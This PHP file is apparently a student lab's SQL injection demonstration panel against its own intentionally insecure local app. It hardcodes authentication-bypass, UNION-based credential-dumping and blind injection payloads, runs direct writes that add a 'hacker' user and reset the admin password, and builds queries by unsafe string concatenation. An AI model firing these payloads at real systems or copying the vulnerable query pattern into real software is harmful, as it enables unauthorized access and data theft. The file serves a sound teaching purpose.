<?php
// Vulnerable App – SQL Injection Attack Demonstration Panel
// Lab 5 | Group 5
// WARNING: FOR EDUCATIONAL USE ONLY — intentionally insecure

session_start();
require_once 'connection.php';

$output      = null;   // query result rows
$sql_shown   = null;   // raw SQL shown to user
$error_msg   = null;   // DB error (intentionally displayed)
$attack_name = null;
$attack_desc = null;
$rows_html   = '';

// -----------------------------------------------------------------------
// Execute the chosen attack when form is submitted
// -----------------------------------------------------------------------
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $attack = $_POST['attack'] ?? '';

    switch ($attack) {

        // ------------------------------------------------------------------
        // ATTACK 1: Authentication Bypass
        // ------------------------------------------------------------------
        case 'auth_bypass':
            $attack_name = 'Attack 1 — Authentication Bypass';
            $attack_desc = "Payload injects OR '1'='1' which always evaluates to TRUE. "
                         . "The -- comments out the password check entirely.";
            $username    = "' OR '1'='1' --";
            $password    = "anything";
            $sql_shown   = "SELECT * FROM users WHERE username='$username' AND password='$password'";
            $result      = mysqli_query($conn, $sql_shown);
            break;

        // ------------------------------------------------------------------
        // ATTACK 2: Union-Based Injection
        // ------------------------------------------------------------------
        case 'union_based':
            $attack_name = 'Attack 2 — Union-Based Injection';
            $attack_desc = "UNION appends a second SELECT that dumps all rows from the users table. "
                         . "Both SELECT statements must return the same number of columns.";
            $username    = "' UNION SELECT id, username, password FROM users -- ";
            $password    = "anything";
            $sql_shown   = "SELECT id, username, password FROM users WHERE username='$username' AND password='$password'";
            $result      = mysqli_query($conn, $sql_shown);
            break;

        // ------------------------------------------------------------------
        // ATTACK 3a: Blind SQLi — True Condition
        // ------------------------------------------------------------------
        case 'blind_true':
            $attack_name = 'Attack 3a — Blind Injection (True Condition)';
            $attack_desc = "Appends AND '1'='1' — always true. Login succeeds, "
                         . "confirming 'admin' exists in the database.";
            $username    = "admin' AND '1'='1";
            $password    = "admin123";
            $sql_shown   = "SELECT * FROM users WHERE username='$username' AND password='$password'";
            $result      = mysqli_query($conn, $sql_shown);
            break;

        // ------------------------------------------------------------------
        // ATTACK 3b: Blind SQLi — False Condition
        // ------------------------------------------------------------------
        case 'blind_false':
            $attack_name = 'Attack 3b — Blind Injection (False Condition)';
            $attack_desc = "Appends AND '1'='2' — always false. Login fails even though "
                         . "correct credentials are supplied. Contrast with 3a.";
            $username    = "admin' AND '1'='2";
            $password    = "admin123";
            $sql_shown   = "SELECT * FROM users WHERE username='$username' AND password='$password'";
            $result      = mysqli_query($conn, $sql_shown);
            break;

        // ------------------------------------------------------------------
        // ATTACK 4a: DB Modification — Insert New User
        // ------------------------------------------------------------------
        case 'db_insert':
            $attack_name = 'Attack 4a — DB Modification: Insert New User';
            $attack_desc = "Directly inserts a new user 'hacker' via SQL. "
                         . "Demonstrates persistent database modification.";

            // Show table BEFORE
            $before = mysqli_query($conn, "SELECT id, username, password FROM users");
            $before_rows = [];
            while ($r = mysqli_fetch_assoc($before)) $before_rows[] = $r;

            // Check if hacker already exists
            $check = mysqli_query($conn, "SELECT * FROM users WHERE username='hacker'");
            if (mysqli_num_rows($check) === 0) {
                $insert_sql  = "INSERT INTO users (username, password) VALUES ('hacker', 'pwned')";
                $sql_shown   = $insert_sql;
                $ins_result  = mysqli_query($conn, $insert_sql);
                $insert_msg  = $ins_result ? "✔ INSERT succeeded — new user 'hacker' added." : "✘ INSERT failed: " . mysqli_error($conn);
            } else {
                $sql_shown  = "-- 'hacker' already exists. Showing current table state.";
                $insert_msg = "⚠ User 'hacker' already in table (from a previous run). See table below.";
            }

            // Show table AFTER
            $after = mysqli_query($conn, "SELECT id, username, password FROM users");
            $after_rows = [];
            while ($r = mysqli_fetch_assoc($after)) $after_rows[] = $r;

            // Render before/after tables
            ob_start();
            echo '<div class="ba-grid">';
            echo '<div><p class="ba-label before-label">📸 BEFORE INSERT</p>';
            echo render_table($before_rows) . '</div>';
            echo '<div><p class="ba-label after-label">📸 AFTER INSERT</p>';
            echo render_table($after_rows) . '</div>';
            echo '</div>';
            echo '<p class="insert-msg">' . htmlspecialchars($insert_msg) . '</p>';
            $rows_html = ob_get_clean();
            $result    = null;
            break;

        // ------------------------------------------------------------------
        // ATTACK 4b: DB Modification — Change Admin Password
        // ------------------------------------------------------------------
        case 'db_update':
            $attack_name = 'Attack 4b — DB Modification: Change Admin Password';
            $attack_desc = "Updates admin's password to 'hacked123' directly via SQL. "
                         . "After this, the real admin cannot log in with the original password.";

            // Snapshot BEFORE
            $before    = mysqli_query($conn, "SELECT id, username, password FROM users WHERE username='admin'");
            $brow      = mysqli_fetch_assoc($before);

            // Execute the modification
            $upd_sql   = "UPDATE users SET password='hacked123' WHERE username='admin'";
            $sql_shown = $upd_sql;
            mysqli_query($conn, $upd_sql);

            // Snapshot AFTER
            $after     = mysqli_query($conn, "SELECT id, username, password FROM users WHERE username='admin'");
            $arow      = mysqli_fetch_assoc($after);

            ob_start();
            echo '<div class="ba-grid">';
            echo '<div><p class="ba-label before-label">📸 BEFORE UPDATE</p>';
            echo render_table($brow ? [$brow] : []) . '</div>';
            echo '<div><p class="ba-label after-label">📸 AFTER UPDATE</p>';
            echo render_table($arow ? [$arow] : []) . '</div>';
            echo '</div>';
            echo '<p class="insert-msg">✔ Password changed from <b>admin123</b> → <b>hacked123</b>. Admin is now locked out.</p>';
            $rows_html = ob_get_clean();
            $result    = null;
            break;

        // ------------------------------------------------------------------
        // RESET: Restore DB to original state
        // ------------------------------------------------------------------
        case 'reset_db':
            $attack_name = 'DB Reset — Restore Original State';
            $attack_desc = "Removes the injected 'hacker' user and restores admin's original password.";
            mysqli_query($conn, "DELETE FROM users WHERE username='hacker'");
            mysqli_query($conn, "UPDATE users SET password='admin123' WHERE username='admin'");
            $sql_shown   = "DELETE FROM users WHERE username='hacker';\nUPDATE users SET password='admin123' WHERE username='admin';";
            $result      = mysqli_query($conn, "SELECT id, username, password FROM users");
            break;
    }

    // Render generic result table for non-modification attacks
    if ($result !== false && $result !== null && empty($rows_html)) {
        if ($result === false) {
            $error_msg = "SQL Error: " . mysqli_error($conn);
        } else {
            $all = [];
            while ($r = mysqli_fetch_assoc($result)) $all[] = $r;
            $rows_html = render_table($all, $attack);
        }
    }
}

// -----------------------------------------------------------------------
// Helper: render an HTML table from an array of rows
// -----------------------------------------------------------------------
function render_table(array $rows, string $attack_type = ''): string {
    if (empty($rows)) {
        return '<p class="no-rows">⚠ 0 rows returned — condition evaluated to FALSE (blind injection confirmed).</p>';
    }
    $html  = '<table>';
    $html .= '<tr>';
    foreach (array_keys($rows[0]) as $col) {
        $html .= '<th>' . htmlspecialchars($col) . '</th>';
    }
    $html .= '</tr>';
    foreach ($rows as $i => $row) {
        $class = ($attack_type === 'union_based' && $i > 0) ? ' class="injected-row"' : '';
        $html .= "<tr$class>";
        foreach ($row as $val) {
            $html .= '<td>' . htmlspecialchars($val ?? 'NULL') . '</td>';
        }
        $html .= '</tr>';
    }
    $html .= '</table>';
    if ($attack_type === 'union_based' && count($rows) > 1) {
        $html .= '<p class="union-note">🔴 Highlighted rows = data injected via UNION</p>';
    }
    return $html;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>SQLi Attack Panel | Vulnerable App</title>
  <link rel="stylesheet" href="style.css"/>
  <style>
    .panel-grid {
      display: grid;
      grid-template-columns: 280px 1fr;
      gap: 20px;
      max-width: 1100px;
      margin: 0 auto;
      padding: 70px 20px 40px;
    }
    /* ---- Sidebar ---- */
    .sidebar h2 {
      font-family: var(--mono); font-size: .72rem; letter-spacing: .15em;
      text-transform: uppercase; color: var(--text-dim); margin-bottom: 12px;
    }
    .attack-btn {
      display: block; width: 100%; margin-bottom: 8px; padding: 11px 14px;
      background: var(--bg-card); border: 1px solid var(--border);
      border-radius: 4px; color: var(--text); font-family: var(--mono);
      font-size: .78rem; text-align: left; cursor: pointer;
      transition: border-color .2s, background .2s;
    }
    .attack-btn:hover  { border-color: var(--accent); background: #1a1020; }
    .attack-btn.active { border-color: var(--accent); background: rgba(231,76,60,.1); color: var(--accent); }
    .attack-btn .tag {
      display: block; font-size: .6rem; letter-spacing: .1em;
      text-transform: uppercase; color: var(--text-dim); margin-bottom: 3px;
    }
    .reset-btn {
      display: block; width: 100%; margin-top: 20px; padding: 10px 14px;
      background: transparent; border: 1px dashed #555; border-radius: 4px;
      color: var(--text-dim); font-family: var(--mono); font-size: .75rem;
      cursor: pointer; transition: border-color .2s, color .2s;
    }
    .reset-btn:hover { border-color: #aaa; color: var(--text); }

    /* ---- Main panel ---- */
    .main-panel { min-height: 500px; }
    .result-card {
      background: var(--bg-card); border: 1px solid var(--border);
      border-radius: 8px; padding: 28px; position: relative; overflow: hidden;
    }
    .result-card::before {
      content:''; position:absolute; top:0; left:0; right:0; height:3px;
      background: linear-gradient(90deg, var(--accent), transparent);
    }
    .result-card h2 { font-size: 1.1rem; margin-bottom: 6px; }
    .result-card .desc {
      font-size: .8rem; color: var(--text-dim); font-family: var(--mono);
      line-height: 1.6; margin-bottom: 20px;
    }

    /* Query box */
    .query-label { font-family: var(--mono); font-size: .65rem; letter-spacing:.1em;
                   text-transform: uppercase; color: var(--text-dim); margin-bottom: 6px; }
    .query-box {
      background: #0d1117; border: 1px solid var(--accent-dim); border-radius: 4px;
      padding: 14px; font-family: var(--mono); font-size: .8rem; color: #f0a500;
      white-space: pre-wrap; word-break: break-all; margin-bottom: 22px;
      line-height: 1.5;
    }
    .query-box .inject { color: var(--danger); font-weight: bold; }

    /* Result table */
    table { width:100%; border-collapse:collapse; font-family:var(--mono);
            font-size:.8rem; margin-top:4px; }
    th, td { border:1px solid var(--border); padding:8px 12px; text-align:left; }
    th { background:rgba(231,76,60,.15); color:var(--accent); letter-spacing:.05em; }
    td { color:var(--text); }
    tr.injected-row td { background: rgba(255,68,68,.08); color: #ff9999; }
    .union-note { font-family:var(--mono); font-size:.72rem; color:#ff9999;
                  margin-top:8px; }
    .no-rows { font-family:var(--mono); font-size:.82rem; color:#f0a500;
               padding:14px; background:rgba(240,165,0,.07);
               border:1px solid rgba(240,165,0,.3); border-radius:4px; }

    /* Before/After grid */
    .ba-grid { display:grid; grid-template-columns:1fr 1fr; gap:16px; margin-bottom:14px; }
    .ba-label { font-family:var(--mono); font-size:.7rem; letter-spacing:.1em;
                text-transform:uppercase; margin-bottom:8px; }
    .before-label { color: var(--text-dim); }
    .after-label  { color: #3fb950; }
    .insert-msg   { font-family:var(--mono); font-size:.8rem; color:#3fb950;
                    margin-top:12px; padding:10px; background:rgba(63,185,80,.08);
                    border:1px solid rgba(63,185,80,.3); border-radius:4px; }

    /* Error */
    .error-box { font-family:var(--mono); font-size:.8rem; color:var(--danger);
                 background:rgba(231,76,60,.08); border:1px solid var(--accent-dim);
                 border-radius:4px; padding:14px; }

    /* Empty state */
    .empty-state {
      display: flex; flex-direction:column; align-items:center;
      justify-content:center; height: 300px;
      color: var(--text-dim); font-family:var(--mono); font-size:.85rem; text-align:center;
    }
    .empty-state .arrow { font-size: 2rem; margin-bottom:12px; opacity:.4; }

    /* Nav */
    .topnav { position:fixed; top:32px; left:0; right:0; z-index:90;
              background:rgba(10,12,16,.9); backdrop-filter:blur(8px);
              border-bottom:1px solid var(--border);
              display:flex; align-items:center; gap:16px; padding:8px 20px;
              font-family:var(--mono); font-size:.72rem; }
    .topnav a { color:var(--text-dim); text-decoration:none; }
    .topnav a:hover { color:var(--text); }
    .topnav .sep { color:var(--border); }
  </style>
</head>
<body>

<div class="warning-banner">⚠ VULNERABLE APPLICATION — SQL INJECTION DEMO PANEL — EDUCATIONAL USE ONLY ⚠</div>

<nav class="topnav">
  <a href="index.php">← Login Page</a>
  <span class="sep">|</span>
  <span style="color:var(--accent);">Attack Demo Panel</span>
  <span class="sep">|</span>
  <a href="http://localhost/secure_app/" target="_blank">Open Secure App ↗</a>
</nav>

<div class="panel-grid">

  <!-- ===================== SIDEBAR ===================== -->
  <aside class="sidebar">
    <h2>⚡ Select Attack</h2>

    <form method="POST" id="atk-form">
      <input type="hidden" name="attack" id="atk-input" value=""/>

      <button type="button" class="attack-btn <?= ($_POST['attack']??'')==='auth_bypass' ? 'active':'' ?>"
              onclick="runAttack('auth_bypass')">
        <span class="tag">Attack 1</span>
        Authentication Bypass
      </button>

      <button type="button" class="attack-btn <?= ($_POST['attack']??'')==='union_based' ? 'active':'' ?>"
              onclick="runAttack('union_based')">
        <span class="tag">Attack 2</span>
        Union-Based Injection
      </button>

      <button type="button" class="attack-btn <?= ($_POST['attack']??'')==='blind_true' ? 'active':'' ?>"
              onclick="runAttack('blind_true')">
        <span class="tag">Attack 3a</span>
        Blind SQLi — True
      </button>

      <button type="button" class="attack-btn <?= ($_POST['attack']??'')==='blind_false' ? 'active':'' ?>"
              onclick="runAttack('blind_false')">
        <span class="tag">Attack 3b</span>
        Blind SQLi — False
      </button>

      <hr style="border-color:var(--border);margin:16px 0;">
      <h2>💾 DB Modification</h2>

      <button type="button" class="attack-btn <?= ($_POST['attack']??'')==='db_insert' ? 'active':'' ?>"
              onclick="runAttack('db_insert')">
        <span class="tag">Attack 4a — MANDATORY</span>
        Insert New User
      </button>

      <button type="button" class="attack-btn <?= ($_POST['attack']??'')==='db_update' ? 'active':'' ?>"
              onclick="runAttack('db_update')">
        <span class="tag">Attack 4b — MANDATORY</span>
        Change Admin Password
      </button>

      <button type="button" class="reset-btn" onclick="runAttack('reset_db')">
        ↺ Reset DB to Original State
      </button>

    </form>
  </aside>

  <!-- ===================== MAIN PANEL ===================== -->
  <main class="main-panel">

    <?php if ($attack_name): ?>
      <div class="result-card">
        <h2><?= htmlspecialchars($attack_name) ?></h2>
        <p class="desc"><?= htmlspecialchars($attack_desc) ?></p>

        <?php if ($sql_shown): ?>
          <p class="query-label">Executed SQL Query</p>
          <div class="query-box"><?= htmlspecialchars($sql_shown) ?></div>
        <?php endif; ?>

        <?php if ($error_msg): ?>
          <div class="error-box">SQL Error (intentionally displayed — insecure practice):<br><?= htmlspecialchars($error_msg) ?></div>
        <?php elseif ($rows_html): ?>
          <p class="query-label">Query Result</p>
          <?= $rows_html ?>
        <?php endif; ?>
      </div>

    <?php else: ?>
      <div class="result-card">
        <div class="empty-state">
          <div class="arrow">←</div>
          <div>Select an attack from the sidebar<br>to see the SQL injection in action.</div>
        </div>
      </div>
    <?php endif; ?>

  </main>
</div>

<script>
function runAttack(type) {
  document.getElementById('atk-input').value = type;
  document.getElementById('atk-form').submit();
}
</script>
</body>
</html>
